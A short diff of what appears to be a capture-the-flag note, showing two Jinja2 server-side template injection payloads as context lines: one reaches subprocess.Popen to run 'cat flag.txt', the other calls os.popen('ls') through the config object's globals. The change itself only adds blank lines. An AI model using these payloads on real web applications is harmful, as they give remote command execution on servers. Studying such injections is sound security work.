@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:23:47.441922+00:00'
 {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
+
+
